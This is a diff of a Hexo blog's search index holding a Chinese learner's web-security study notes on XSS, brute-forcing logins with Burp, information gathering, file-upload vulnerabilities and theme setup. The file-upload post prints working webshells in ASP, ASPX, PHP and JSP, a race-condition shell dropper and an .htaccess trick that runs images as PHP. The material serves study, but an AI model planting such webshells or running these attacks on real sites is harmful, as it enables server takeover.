@@ -19,102 +19,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>网络安全之XSS</title>
-    <url>/posts/3909557445.html</url>
-    <content><![CDATA[<h3 id="针对HTML的注入"><a href="#针对HTML的注入" class="headerlink" title="针对HTML的注入"></a>针对HTML的注入</h3><h2 id="XSS简介："><a href="#XSS简介：" class="headerlink" title="XSS简介："></a>XSS简介：</h2><ul>
-<li>XSS全称叫做跨站脚本（Cross-Site Scripting）攻击，是一种代码注入攻击，往网页中插入恶意的JS脚本<br>比如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射性XSS（非持久型）"><a href="#反射性XSS（非持久型）" class="headerlink" title="反射性XSS（非持久型）"></a>反射性XSS（非持久型）</h3><ul>
-<li>反射性跨站脚本也称非持久型，参数行跨站脚本。反射性XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说黑客往往需要诱使用户“点击”一个恶意软件，才能攻击成功。<br>假设一个页面把用户输入的参数直接输出到页面上：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input = $_GET[&#x27;param&#x27;];</span><br><span class="line">echo &quot;&lt;h1&gt;&quot;.$input.&quot;&lt;/h1&gt;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-用户向param提交的数据会在<h1>的标签中展示出来<br><img src="/posts/3909557445/1.png"></h1></li>
-</ul>
-<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><ul>
-<li>存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存、还是文件系统等），下次请求目标页面时，不用再提交XSS代码。<br>最典型的例子是留言板XSS<br>存储型XSS的攻击是最隐蔽的也是为还比较大的，普通用户看到的代码是正常的，担当用户查看留言版的时候，那些流言会从数据库中查询出来并显示，浏览器发现有XSS代码，就当作正常的HTML与JS解析执行，于是就出发了XSS攻击。</li>
-</ul>
-<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><ul>
-<li>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。他和反射型XSS和存储型XSS的差别在于DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器的DOM解析，可以认为完全就是客户端的事。<br><img src="/posts/3909557445/2.png"></li>
-</ul>
-]]></content>
-  </entry>
-  <entry>
-    <title>网络安全学习之密码爆破</title>
-    <url>/posts/29527.html</url>
-    <content><![CDATA[<h2 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h2><h3 id="四位数字爆破。"><a href="#四位数字爆破。" class="headerlink" title="四位数字爆破。"></a>四位数字爆破。</h3><ul>
-<li>抓包添加payload，设置密码模块为数字即可，范围0000-9999<br>数字格式：<br>基地：Decimal<br>整数部分的最小位数：4<br>少数民族最小位数：0<br>少数最大字数：0<br>通过长度判断正确包</li>
-</ul>
-<h3 id="简单的脱弱口令爆破："><a href="#简单的脱弱口令爆破：" class="headerlink" title="简单的脱弱口令爆破："></a>简单的脱弱口令爆破：</h3><p>找一个好用的字典，设置爆破参数和类型，加载字典。通过返回包长度判断。</p>
-<h3 id="带验证码爆破？"><a href="#带验证码爆破？" class="headerlink" title="带验证码爆破？"></a>带验证码爆破？</h3><p>注意：不要放包，只要一直不放包，验证码就不会失效，否则，验证码改变会导致爆破不成功。 （验证码复用）其余一样。</p>
-<h3 id="Basic认证爆破"><a href="#Basic认证爆破" class="headerlink" title="Basic认证爆破"></a>Basic认证爆破</h3><ul>
-<li>打开发现是一个类似于basic认证的框，输入数据抓包。<br>发现是base64加密字段，推测basic字段是 用户名：密码 这种格式的base64加密形式。在xintruder中添加basic的加密字段，payload1选择自定义迭代器（Custom itermtor）。<br>然后设置定位分隔符和用户名，在位置2添加密码即可<br>然后在有效荷载里面添加base64编码模块<br>因为base64会自动编码特殊字符，需要取消后面的payload url自动编码</li>
-</ul>
-<h3 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h3><ul>
-<li>随便输入密码，发现密码是一串MD5值，解密发现是输入的密码，猜测是前端加密，同样的发送到intruder模块进行设置。<br>在payload的编码设置添加hash的md5加密模块</li>
-</ul>
-<h3 id="泄露数据撞库"><a href="#泄露数据撞库" class="headerlink" title="泄露数据撞库"></a>泄露数据撞库</h3><p><img src="/posts/29527/First.png" alt="例题"></p>
-<ul>
-<li>bp抓包，清掉所有变量，标记密码用户名，选择音叉攻击（一一对应的攻击），导入密码用户名开始攻击。通过返回长度找到正确的账号密码。<br><img src="/posts/29527/Second.png"></li>
-</ul>
-<h3 id="返回包特征提取爆破"><a href="#返回包特征提取爆破" class="headerlink" title="返回包特征提取爆破"></a>返回包特征提取爆破</h3><p><img src="/posts/29527/3.png"><br>若登陆成功和登陆失败返回的长度一样，则在options添加选项中，从返回包中获取返回的字段，可以直接在返回包中看到结果  </p>
-<h3 id="数据包传输类型"><a href="#数据包传输类型" class="headerlink" title="数据包传输类型"></a>数据包传输类型</h3><ul>
-<li>application….from urlLencode</li>
-<li>payload打开密码字典以换行为分割</li>
-<li>批量请求，寻找flag</li>
-</ul>
-<h3 id="简单的token验证"><a href="#简单的token验证" class="headerlink" title="简单的token验证"></a>简单的token验证</h3><ul>
-<li>token时间戳验证</li>
-</ul>
-<h3 id="识别验证码爆破"><a href="#识别验证码爆破" class="headerlink" title="识别验证码爆破"></a>识别验证码爆破</h3><p><img src="/posts/29527/4.png"></p>
-<ul>
-<li>工具：PKAV HTTP Fuzzer</li>
-<li>验证码识别重放模式为单线程</li>
-<li>这次比之前增加了验证码验证模块，码源提示ocr，容易想到利用burp的插件来进行验证码识别爆破。<br>这里用的是captcha-killer插件，开源地址：<a href="http://github.com/c0ny1/captcha-killer">http://github.com/c0ny1/captcha-killer</a><br>先利用burp抓取生成验证码页面，发送到插件的验证码识别模块。</li>
-</ul>
-<h2 id="防止爆破的方法"><a href="#防止爆破的方法" class="headerlink" title="防止爆破的方法"></a>防止爆破的方法</h2><ul>
-<li>多因素认证，爆破次数太多会锁定，但漏洞会导致管理也无法登录。</li>
-<li>sso————统一登陆认证</li>
-<li>加密</li>
-<li>token</li>
-<li>验证码</li>
-</ul>
-]]></content>
-  </entry>
-  <entry>
-    <title>hexo修改主题</title>
-    <url>/posts/38893.html</url>
-    <content><![CDATA[<ul>
-<li>默认主题千篇一律，要想有自己的东西，就要和别人不一样，所以搭建好自己的博客，当然要按照自己的喜好来布置主题啦</li>
-</ul>
-<hr>
-<h2 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h2><ul>
-<li>找到主题的下载链接,例如：<a href="https://github.com/Fechin/hexo-theme-diaspora.git">https://github.com/Fechin/hexo-theme-diaspora.git</a> themes&#x2F;diaspora，然后在gitbash中输入<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/Fechin/hexo-theme-diaspora.git themes/diaspora</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="启用主题"><a href="#启用主题" class="headerlink" title="启用主题"></a>启用主题</h2><ul>
-<li>修改Hexo配置文件_config.yml主题设置为diaspora<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">theme:diaspora//注意，在这里的主题名要与themes文件夹中的主题文件名一致</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="更新主题"><a href="#更新主题" class="headerlink" title="更新主题"></a>更新主题</h2><ul>
-<li>注意：在更新主题时备份_config.yml配置文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> themes/diaspora</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="创建一个分类页面"><a href="#创建一个分类页面" class="headerlink" title="创建一个分类页面"></a>创建一个分类页面</h2><ul>
-<li>新建一个页面，命名为categories。命令如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure></li>
-<li>编辑刚新建的页面，将页面的类型设置为categories<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="创建标签页"><a href="#创建标签页" class="headerlink" title="创建标签页"></a>创建标签页</h2><ul>
-<li>新建一个页面，命名为tags。命令如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure></li>
-<li>编辑刚新建的页面，将页面设置为tags<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="创建搜索页"><a href="#创建搜索页" class="headerlink" title="创建搜索页"></a>创建搜索页</h2><ul>
-<li>需要安装hexo的搜索插件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure></li>
-<li>安装完成后输入以下命令查看安装情况<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm <span class="built_in">ls</span> --depth 0//一般不需要，因为正常情况不会出现安装失败</span><br></pre></td></tr></table></figure></li>
-<li>配置hexo全局配置文件（请将生成的索引文件放在网站根目录或修改主题js文件的path值）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  <span class="built_in">limit</span>: 10000</span><br></pre></td></tr></table></figure>
-以上代码直接复制粘贴到全局配置文件中</li>
-<li>新建一个页面，命名为search。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page search</span><br></pre></td></tr></table></figure></li>
-<li>编辑刚新建的页面，将页面的类型设置为search<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;search&quot;</span></span><br></pre></td></tr></table></figure></li>
-<li>在主题配置文件启用本地搜索（此配置文件在themes文件夹下）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地搜索,请将索引文件放在网站根目录</span></span><br><span class="line">local_search:</span><br><span class="line">    <span class="comment">#是否启用</span></span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-<li>最后部署到GitHub<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean//清除缓存</span><br><span class="line">hexo g//生成静态文件</span><br><span class="line">hexo s//启动服务器</span><br><span class="line">hexo d//部署，用于将网站部署到服务器上</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-  </entry>
-  <entry>
     <title>网络安全学习之信息收集</title>
     <url>/posts/45922.html</url>
     <content><![CDATA[<h3 id="渗透的本质就是信息收集"><a href="#渗透的本质就是信息收集" class="headerlink" title="渗透的本质就是信息收集"></a>渗透的本质就是信息收集</h3><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
@@ -165,6 +69,139 @@
 <li>返回包直接提取指纹信息  </li>
 <li>网站源码指纹提取指纹信息  </li>
 <li>指定文件的MD5值校验</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>hexo修改主题</title>
+    <url>/posts/38893.html</url>
+    <content><![CDATA[<ul>
+<li>默认主题千篇一律，要想有自己的东西，就要和别人不一样，所以搭建好自己的博客，当然要按照自己的喜好来布置主题啦</li>
+</ul>
+<hr>
+<h2 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h2><ul>
+<li>找到主题的下载链接,例如：<a href="https://github.com/Fechin/hexo-theme-diaspora.git">https://github.com/Fechin/hexo-theme-diaspora.git</a> themes&#x2F;diaspora，然后在gitbash中输入<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/Fechin/hexo-theme-diaspora.git themes/diaspora</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="启用主题"><a href="#启用主题" class="headerlink" title="启用主题"></a>启用主题</h2><ul>
+<li>修改Hexo配置文件_config.yml主题设置为diaspora<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">theme:diaspora//注意，在这里的主题名要与themes文件夹中的主题文件名一致</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="更新主题"><a href="#更新主题" class="headerlink" title="更新主题"></a>更新主题</h2><ul>
+<li>注意：在更新主题时备份_config.yml配置文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> themes/diaspora</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="创建一个分类页面"><a href="#创建一个分类页面" class="headerlink" title="创建一个分类页面"></a>创建一个分类页面</h2><ul>
+<li>新建一个页面，命名为categories。命令如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure></li>
+<li>编辑刚新建的页面，将页面的类型设置为categories<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="创建标签页"><a href="#创建标签页" class="headerlink" title="创建标签页"></a>创建标签页</h2><ul>
+<li>新建一个页面，命名为tags。命令如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure></li>
+<li>编辑刚新建的页面，将页面设置为tags<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="创建搜索页"><a href="#创建搜索页" class="headerlink" title="创建搜索页"></a>创建搜索页</h2><ul>
+<li>需要安装hexo的搜索插件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure></li>
+<li>安装完成后输入以下命令查看安装情况<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm <span class="built_in">ls</span> --depth 0//一般不需要，因为正常情况不会出现安装失败</span><br></pre></td></tr></table></figure></li>
+<li>配置hexo全局配置文件（请将生成的索引文件放在网站根目录或修改主题js文件的path值）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  <span class="built_in">limit</span>: 10000</span><br></pre></td></tr></table></figure>
+以上代码直接复制粘贴到全局配置文件中</li>
+<li>新建一个页面，命名为search。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page search</span><br></pre></td></tr></table></figure></li>
+<li>编辑刚新建的页面，将页面的类型设置为search<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;search&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li>在主题配置文件启用本地搜索（此配置文件在themes文件夹下）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地搜索,请将索引文件放在网站根目录</span></span><br><span class="line">local_search:</span><br><span class="line">    <span class="comment">#是否启用</span></span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li>最后部署到GitHub<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean//清除缓存</span><br><span class="line">hexo g//生成静态文件</span><br><span class="line">hexo s//启动服务器</span><br><span class="line">hexo d//部署，用于将网站部署到服务器上</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>网络安全学习之XSS</title>
+    <url>/posts/3909557445.html</url>
+    <content><![CDATA[<h3 id="针对HTML的注入"><a href="#针对HTML的注入" class="headerlink" title="针对HTML的注入"></a>针对HTML的注入</h3><h2 id="XSS简介："><a href="#XSS简介：" class="headerlink" title="XSS简介："></a>XSS简介：</h2><ul>
+<li>XSS全称叫做跨站脚本（Cross-Site Scripting）攻击，是一种代码注入攻击，往网页中插入恶意的JS脚本<br>比如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射性XSS（非持久型）"><a href="#反射性XSS（非持久型）" class="headerlink" title="反射性XSS（非持久型）"></a>反射性XSS（非持久型）</h3><ul>
+<li>反射性跨站脚本也称非持久型，参数行跨站脚本。反射性XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说黑客往往需要诱使用户“点击”一个恶意软件，才能攻击成功。<br>假设一个页面把用户输入的参数直接输出到页面上：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input = $_GET[&#x27;param&#x27;];</span><br><span class="line">echo &quot;&lt;h1&gt;&quot;.$input.&quot;&lt;/h1&gt;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+用户向param提交的数据会在<h1>的标签中展示出来<br><img src="/posts/3909557445/1.png"></h1></li>
+</ul>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><ul>
+<li>存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存、还是文件系统等），下次请求目标页面时，不用再提交XSS代码。<br>最典型的例子是留言板XSS<br>存储型XSS的攻击是最隐蔽的也是为还比较大的，普通用户看到的代码是正常的，担当用户查看留言版的时候，那些流言会从数据库中查询出来并显示，浏览器发现有XSS代码，就当作正常的HTML与JS解析执行，于是就出发了XSS攻击。</li>
+</ul>
+<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><ul>
+<li>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。他和反射型XSS和存储型XSS的差别在于DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器的DOM解析，可以认为完全就是客户端的事。<br><img src="/posts/3909557445/2.png"></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>网络安全学习之文件上传</title>
+    <url>/posts/2682.html</url>
+    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><ul>
+<li>简介：现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。  </li>
+<li>漏洞产生原因：<br>上传文件时，如果服务器端没有对客户端上传的文件进行严格的检验或过滤，就容易造成可上传任意文件的情况，包括上传脚本文件（asp，aspx，php，jsp）  </li>
+<li>漏洞的危害：<br>非法用户可以利用上传的脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</li>
+<li>ASP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;x&quot;</span>)%&gt;//密码是‘x’</span><br><span class="line">&lt;%execute request(<span class="string">&quot;x&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>ASPX  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">&quot;x&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>PHP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])?&gt;  //比较标准的用法；不一定是post，也可以是get</span><br><span class="line">&lt;?php assert(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];?)&gt;  //php版本&gt;7时不能用了</span><br></pre></td></tr></table></figure></li>
+<li>JSP CMD WebShall  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">    if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;)))</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInp</span><br><span class="line">        int a=-1;</span><br><span class="line">        byte[] b=new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>文件上传漏洞的条件<br>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径<br>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也就不能被称之为漏洞<br>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，也可能导致攻击不成功  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">&lt;?php eval($_GET[1]);?&gt;</span><br><span class="line">?1=system(whoami);</span><br><span class="line">&lt;?php eval(system(whoami););?&gt;</span><br><span class="line">$_GET=&gt;接受GET参数</span><br><span class="line">$_POST=&gt;接受POST参数</span><br><span class="line">$_REQUEST=&gt;接受GET参数 POST Cookie 参数</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件头绕过："><a href="#文件头绕过：" class="headerlink" title="文件头绕过："></a>文件头绕过：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JPEG(jpg), 文件头：FFD8FF</span><br><span class="line">PNG(png), 文件头：89504E47</span><br><span class="line">GIF(gig), 文件头：47494638</span><br><span class="line">HTML(html), 文件头：68746D6C3E</span><br><span class="line">ZIP Archive(Zip), 文件头：504B0304</span><br><span class="line">RAR Achive(rar), 文件头：52617221</span><br><span class="line">Adobe Acrobat(pdf), 文件头：255044462D312E</span><br><span class="line">MS Word/Excel(xls.or.doc), 文件头：D0CF11E0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>白名单策略：只允许上传xxx后缀  jpg jpeg png gif<br>黑名单策略：不允许上传xxx后缀<br>白名单是设置能通过用户，黑名单是设置不能通过用户，所以一般情况下，白名单比黑名单限制的用户多些</li>
+</ul>
+<h2 id="htaccess："><a href="#htaccess：" class="headerlink" title=".htaccess："></a>.htaccess：</h2><ul>
+<li>是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许&#x2F;组织特定的用户或目录的访问，禁止默认列表，配置默认文档等功能。</li>
+<li>grep -r “application&#x2F;x-httpd-php” &#x2F;etc<br>手动查询etc目录下包含”application&#x2F;x-httpd-php”的文件  </li>
+<li>htaccess解析规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></li>
+<li>PHP内核是由C语言实现的，所以使用了C语言中一些字符串处理函数，比如在连接字符串的时候，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串<br>00 截断常配合目录截断</li>
+</ul>
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
+<li>简介 ：是一个系统的运行结果不受控制时间的先后顺序。当这些不受控制的事件没有按照开发者想要的方式运行的时候，就可能出现bug，尤其在当我们的系统中大量对资源进行共享，，如果处理不当就会产生条件竞争漏洞。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除他的间隙，攻击者通过不断的发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意的shell文件，至此该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把他删除的问题就已经不重要了，因为攻击者已经成功地在服务器中植入了一个shell文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命等待有缘人的光顾，然后快速生成一个小webshell。这类WebShell大体内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao,php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST(1));?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><ul>
+<li>原理：上传文件后，网站会对图片进行二次处理(格式、尺寸、要求等)，服务器会把里面的内容进行替换和更新。处理完成后，根据原有的图片生成一个新的图片并放到网站对应的标签进行显示。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$im = imagecreatefromjpeg( $upload_file);</span><br><span class="line">$im = imagecreatefrompng( $upload_file);</span><br><span class="line">$im = imagecreatefromgif( $upload_file);</span><br></pre></td></tr></table></figure></li>
+<li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li>
+<li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT 数据块</li>
+<li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试渲染两次会返回正确木马</li>
+<li>JPG坑点总结<br>需要被imagecreatefromjpeg渲染或再用工具<br>图片找的稍微大一点成功率更高<br>Payload语句越短成功率越高<br>一张图片不行就换一张不要死磕  </li>
+<li>国光补充:貌似白色的图片成功率也比较高<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $_GET[0]($_POST[1]);?&gt; 这种payload成功率很高</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2>]]></content>
+  </entry>
+  <entry>
+    <title>网络安全学习之密码爆破</title>
+    <url>/posts/29527.html</url>
+    <content><![CDATA[<h2 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h2><h3 id="四位数字爆破。"><a href="#四位数字爆破。" class="headerlink" title="四位数字爆破。"></a>四位数字爆破。</h3><ul>
+<li>抓包添加payload，设置密码模块为数字即可，范围0000-9999<br>数字格式：<br>基地：Decimal<br>整数部分的最小位数：4<br>少数民族最小位数：0<br>少数最大字数：0<br>通过长度判断正确包</li>
+</ul>
+<h3 id="简单的脱弱口令爆破："><a href="#简单的脱弱口令爆破：" class="headerlink" title="简单的脱弱口令爆破："></a>简单的脱弱口令爆破：</h3><p>找一个好用的字典，设置爆破参数和类型，加载字典。通过返回包长度判断。</p>
+<h3 id="带验证码爆破？"><a href="#带验证码爆破？" class="headerlink" title="带验证码爆破？"></a>带验证码爆破？</h3><p>注意：不要放包，只要一直不放包，验证码就不会失效，否则，验证码改变会导致爆破不成功。 （验证码复用）其余一样。</p>
+<h3 id="Basic认证爆破"><a href="#Basic认证爆破" class="headerlink" title="Basic认证爆破"></a>Basic认证爆破</h3><ul>
+<li>打开发现是一个类似于basic认证的框，输入数据抓包。<br>发现是base64加密字段，推测basic字段是 用户名：密码 这种格式的base64加密形式。在xintruder中添加basic的加密字段，payload1选择自定义迭代器（Custom itermtor）。<br>然后设置定位分隔符和用户名，在位置2添加密码即可<br>然后在有效荷载里面添加base64编码模块<br>因为base64会自动编码特殊字符，需要取消后面的payload url自动编码</li>
+</ul>
+<h3 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h3><ul>
+<li>随便输入密码，发现密码是一串MD5值，解密发现是输入的密码，猜测是前端加密，同样的发送到intruder模块进行设置。<br>在payload的编码设置添加hash的md5加密模块</li>
+</ul>
+<h3 id="泄露数据撞库"><a href="#泄露数据撞库" class="headerlink" title="泄露数据撞库"></a>泄露数据撞库</h3><p><img src="/posts/29527/First.png" alt="例题"></p>
+<ul>
+<li>bp抓包，清掉所有变量，标记密码用户名，选择音叉攻击（一一对应的攻击），导入密码用户名开始攻击。通过返回长度找到正确的账号密码。<br><img src="/posts/29527/Second.png"></li>
+</ul>
+<h3 id="返回包特征提取爆破"><a href="#返回包特征提取爆破" class="headerlink" title="返回包特征提取爆破"></a>返回包特征提取爆破</h3><p><img src="/posts/29527/3.png"><br>若登陆成功和登陆失败返回的长度一样，则在options添加选项中，从返回包中获取返回的字段，可以直接在返回包中看到结果  </p>
